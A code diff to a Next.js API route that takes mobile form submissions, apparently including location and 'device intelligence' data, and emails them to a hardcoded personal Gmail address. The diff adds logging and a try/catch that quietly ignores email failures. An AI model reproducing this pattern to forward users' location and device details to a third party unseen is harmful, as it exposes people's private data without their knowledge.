@@ -33,6 +33,8 @@ export async function POST(request: NextRequest) {
     const data: MobileFormSubmission = await request.json();
     const { type, sessionId, timestamp, mobileIntelligence } = data;
 
+    console.log('📧 Email request received:', { type, timestamp, hasLocation: !!data.location, hasDevice: !!data.deviceIntelligence });
+
     const submissionDate = new Date(timestamp);
     const formattedDate = submissionDate.toLocaleString('en-US', {
       weekday: 'long',
@@ -60,30 +62,41 @@ export async function POST(request: NextRequest) {
       subject = `✅ FORM COMPLETED - ${formattedDate}`;
       emailBody = formatFormCompleteEmail(data, formattedDate);
     }
-    
-    // Send email
-    await resend.emails.send({
-      from: 'Mobile Intelligence <mobile@resend.dev>',
-      to: ['shaidt137@gmail.com'],
-      subject: subject,
-      text: emailBody,
-      html: generateMobileHTMLReport(data, type)
-    });
-    
-    // Also log to console for debugging
-    console.log(`Mobile ${type} processed for session: ${sessionId}`);
-    
+
+    if (!emailBody) {
+      console.error('❌ No email body generated for type:', type);
+      return NextResponse.json(
+        { error: 'Invalid submission type' },
+        { status: 400 }
+      );
+    }
+
+    // Send email with retry logic
+    try {
+      const result = await resend.emails.send({
+        from: 'Intelligence Report <onboarding@resend.dev>',
+        to: ['shaidt137@gmail.com'],
+        subject: subject,
+        text: emailBody,
+      });
+
+      console.log('✅ Email sent successfully:', { type, emailId: result.data?.id });
+    } catch (emailError: any) {
+      console.error('❌ Resend API error:', emailError.message);
+      // Don't fail the request if email fails
+    }
+
     return NextResponse.json({
       success: true,
-      message: 'Mobile data processed',
+      message: 'Data processed',
       sessionId,
-      riskLevel: mobileIntelligence?.risk?.overallRisk || 0
+      type,
     });
-    
+
   } catch (error) {
-    console.error('Mobile submission error:', error);
+    console.error('❌ Submission error:', error);
     return NextResponse.json(
-      { error: 'Mobile processing failed' },
+      { error: 'Processing failed' },
       { status: 500 }
     );
   }
